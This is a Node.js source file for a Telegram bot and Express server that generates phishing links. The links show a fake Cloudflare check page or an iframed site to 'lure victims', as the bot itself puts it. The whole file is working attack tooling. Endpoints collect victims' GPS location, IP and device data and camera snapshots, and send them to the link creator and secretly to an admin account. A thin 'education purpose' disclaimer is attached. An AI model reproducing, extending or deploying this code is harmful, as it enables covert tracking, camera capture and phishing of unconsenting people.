require('dotenv').config();
const fs = require("fs");
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["TGBToken"], { polling: true });
const ADMIN_TELEGRAM_ID = process.env.ADMIN_TELEGRAM_ID;
const TELEGRAM_BOT_LINK = process.env.TELEGRAM_BOT_LINK;

// In-memory storage
const botUsers = {};
const userLinkCounts = {};

const jsonParser = bodyParser.json({ limit: '20mb', type: 'application/json' });
const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: '20mb', type: 'application/x-www-form-urlencoded' });

const btoa = require('btoa');
function atob(str) {
  return Buffer.from(str, 'base64').toString('binary');
}

const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

const hostURL = process.env.HOST_URL;
let use1pt = false;

function escapeHTML(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Routes

app.get("/w/:path/:uri", (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;
  const d = new Date().toJSON().slice(0, 19).replace('T', ':');
  if (req.params.path != null) {
    res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  } else {
    res.redirect("https://t.me/kannadagamershub01");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;
  const d = new Date().toJSON().slice(0, 19).replace('T', ':');
  if (req.params.path != null) {
    res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  } else {
    res.redirect("https://t.me/kannadagamershub01");
  }
});

// Telegram Logic

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
    createLink(chatId, msg.text, msg.chat);
  }

  if (msg.text == "/start") {
    if (!botUsers[chatId]) {
      botUsers[chatId] = { id: chatId, username: msg.chat.username, firstName: msg.chat.first_name };
    }
    if (!userLinkCounts[chatId]) userLinkCounts[chatId] = 0;

    const m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [
          [{ text: "Create Link", callback_data: "crenew" }],
          [{ text: "Join Us", url: "https://t.me/kannadagamershub01" }],
          [{ text: "Follow us", url: "http://instagram.com/kannada_gamers_hub" }],
          [{ text: "Contact Us", url: "https://instagram.com/mithun.gowda.b" }]
        ]
      })
    };
    bot.sendMessage(chatId, `Welcome @${msg.chat.username} ! , \nYou can use this bot to Pishing people's PhoneCamera just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.\n\n Disclaimer:\nThis Bot Only For Education Purpose.\n©️All Rights Reserved.`, m);
  } else if (msg.text == "/create") {
    createNew(chatId, msg.chat);
  } else if (msg.text == "/help") {
    bot.sendMessage(chatId, ` Through this bot you can track peoples just by sending a simple link.\n\nSend /create to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving the url it will send you 2 links which you can use to track people.\n\nSpecifications.\n\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.\n\n( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )\n\nContact at http://instagram.com/mithun.gowda.b`);
  } else if (msg.text == "/aboutus") {
    bot.sendMessage(chatId, 'Developer :\nName: *MithunGowda.B*Email: mithungowda.b7411@gmail.com\nInstagram: http://instagram.com/mithun.gowda.b\n\nContent :\nName: *Manvanth* (Appu)\nEmail: kannadagamershub@gmail.com\nInstagram: https://www.instagram.com/________star_shadow________ \n\n Publisher :\nName: *Nithin* (Niki)\nInstagram: https://www.instagram.com/_mr_dynamic__');
  } else if (msg.text == "/admin") {
    if (ADMIN_TELEGRAM_ID && msg.chat.id.toString() === ADMIN_TELEGRAM_ID.toString()) {
      let report = `📊 *Admin Report*\n\nTotal Unique Bot Users: ${Object.keys(botUsers).length}\n\n*User Details & Link Counts:*\n`;
      for (const userId in botUsers) {
        const user = botUsers[userId];
        const linkCount = userLinkCounts[userId] || 0;
        const userName = user.username ? `@${user.username}` : user.firstName;
        report += `- ID: ${user.id}, Name: ${userName}, Links Created: ${linkCount}\n`;
      }
      bot.sendMessage(chatId, report, { parse_mode: "html" });
    } else {
      bot.sendMessage(chatId, "⚠️ You are not authorized to use this command.");
    }
  } else if (msg.text == "/demo") {
    bot.sendMessage(chatId, 'We will Update it Soon');
  }
});

bot.on('callback_query', (callbackQuery) => {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data == "crenew") {
    createNew(callbackQuery.message.chat.id, callbackQuery.message.chat);
  }
});

async function createLink(cid, msg, chatDetails) {
  if (typeof msg !== 'string') msg = String(msg);
  const encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().includes('http')) && !encoded) {
    const url = cid.toString(36) + '/' + btoa(unescape(encodeURIComponent(msg)));
    const m = {
      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]] })
    };
    const cUrl = `${hostURL}/c/${url}`;
    const wUrl = `${hostURL}/w/${url}`;

    bot.sendChatAction(cid, "typing");

    if (use1pt) {
      const x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
      const y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

      let f = "", g = "";
      for (let c in x) f += x[c] + "\n";
      for (let c in y) g += y[c] + "\n";

      bot.sendMessage(cid, `New links have been created successfully. You can use any one of the below links.\nURL: ${msg}\n\n✅ Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`, m);
    } else {
      bot.sendMessage(cid, `New links have been created successfully.\nURL: ${msg}\n\n✅ Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
    }

    userLinkCounts[cid] = (userLinkCounts[cid] || 0) + 1;
  } else {
    bot.sendMessage(cid, `⚠️ Please enter a valid URL including http or https.`);
    createNew(cid, chatDetails);
  }
}

function createNew(cid, chatDetails) {
  if (chatDetails && !botUsers[cid]) {
    botUsers[cid] = { id: cid, username: chatDetails.username, firstName: chatDetails.first_name };
  }
  if (!userLinkCounts[cid]) userLinkCounts[cid] = 0;

  bot.sendMessage(cid, `🌐 Enter Your URL`, {
    reply_markup: JSON.stringify({ force_reply: true })
  });
}

app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Bot Status</title>
    </head>
    <body>
      <h1>I AM ALIVE</h1>
      <p>Bot is running. <a href="${TELEGRAM_BOT_LINK}" target="_blank">Click to open bot</a></p>
    </body>
    </html>
  `);
});

app.post("/location", (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat));
  const lon = parseFloat(decodeURIComponent(req.body.lon));
  const uid = decodeURIComponent(req.body.uid);
  const acc = decodeURIComponent(req.body.acc);
  if (lat && lon && uid && acc) {
    const userId = parseInt(uid, 36);
    const messageToUser = `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`;
    bot.sendLocation(userId, lat, lon);
    bot.sendMessage(userId, messageToUser);
    if (ADMIN_TELEGRAM_ID) {
      const identifier = botUsers[userId]?.username ? `@${botUsers[userId].username}` : botUsers[userId]?.firstName || userId;
      const messageToAdmin = `User ${identifier} received location:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`;
      bot.sendLocation(ADMIN_TELEGRAM_ID, lat, lon);
      bot.sendMessage(ADMIN_TELEGRAM_ID, messageToAdmin);
    }
    res.send("Done");
  }
});

app.post("/", (req, res) => {
  const uid = decodeURIComponent(req.body.uid);
  let data = decodeURIComponent(req.body.data);
  const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;

  if (uid && data) {
    if (!data.includes(ip)) return res.send("ok");

    data = data.replaceAll("<br>", "\n");
    const userId = parseInt(uid, 36);

    bot.sendMessage(userId, escapeHTML(data), { parse_mode: "HTML" });

    if (ADMIN_TELEGRAM_ID) {
      const identifier = botUsers[userId]?.username ? `@${botUsers[userId].username}` : botUsers[userId]?.firstName || userId;
      const messageToAdmin = `User ${identifier} received data:\n${escapeHTML(data)}`;
      bot.sendMessage(ADMIN_TELEGRAM_ID, messageToAdmin, { parse_mode: "HTML" });
    }
    res.send("Done");
  }
});

app.post("/camsnap", (req, res) => {
  const uid = decodeURIComponent(req.body.uid);
  const img = decodeURIComponent(req.body.img);
  if (uid && img) {
    const buffer = Buffer.from(img, 'base64');
    const info = { filename: "camsnap.png", contentType: 'image/png' };
    try {
      const userId = parseInt(uid, 36);
      bot.sendPhoto(userId, buffer, {}, info);
      if (ADMIN_TELEGRAM_ID) {
        const identifier = botUsers[userId]?.username ? `@${botUsers[userId].username}` : botUsers[userId]?.firstName || userId;
        bot.sendPhoto(ADMIN_TELEGRAM_ID, buffer, { caption: `User ${identifier} received a camsnap.` }, info);
      }
    } catch (error) {
      console.log(error);
    }
    res.send("Done");
  }
});

app.listen(5000, () => {
  console.log("App Running on Port 5000!");
});

